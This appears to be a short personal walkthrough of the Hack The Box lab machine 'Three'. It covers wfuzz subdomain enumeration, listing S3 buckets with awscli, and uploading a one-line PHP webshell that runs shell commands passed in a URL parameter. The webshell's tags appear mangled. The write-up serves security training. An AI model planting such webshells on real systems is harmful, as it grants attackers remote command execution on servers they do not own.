---
title: "Three"
category: ["HTB", "Machines", "Three"]
---



Note title: Three

- To discover additional subdomains we can use this: `wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "link_pagina" -H "Host: FUZZ.link_pagina" --hw 1036 -t 5` with the fuzz tool  
![Pasted image 20240305212318](/VaultSite/wiki-images/Pasted%20image%2020240305212318.png)  
- We found that Amazon S3 runs on the subdomain  
![Pasted image 20240305212302](/VaultSite/wiki-images/Pasted%20image%2020240305212302.png)  
- To interact with the service running on the discovered subdomain, we use **awscli**  
- To configure the awscli installation, use **aws configure**  
- To list all S3 buckets, use **aws s3 ls**, but in this case it doesn't allow us and redirects to a help page  
- ![Pasted image 20240305212847](/VaultSite/wiki-images/Pasted%20image%2020240305212847.png)  
- And there we found this command  
![Pasted image 20240305212950](/VaultSite/wiki-images/Pasted%20image%2020240305212950.png)  
- We determined it's PHP  
![Pasted image 20240305213736](/VaultSite/wiki-images/Pasted%20image%2020240305213736.png)  
We create a webshell (a shell accessible via web, very useful when firewalls are filtering) with `nano -?php system($_GET['cmd']); ?-`  
![Pasted image 20240305214043](/VaultSite/wiki-images/Pasted%20image%2020240305214043.png)  
- Now we copy this file to the S3 bucket  
-![Pasted image 20240305214140](/VaultSite/wiki-images/Pasted%20image%2020240305214140.png)  
![Pasted image 20240305214150](/VaultSite/wiki-images/Pasted%20image%2020240305214150.png)  
![Pasted image 20240305214159](/VaultSite/wiki-images/Pasted%20image%2020240305214159.png)
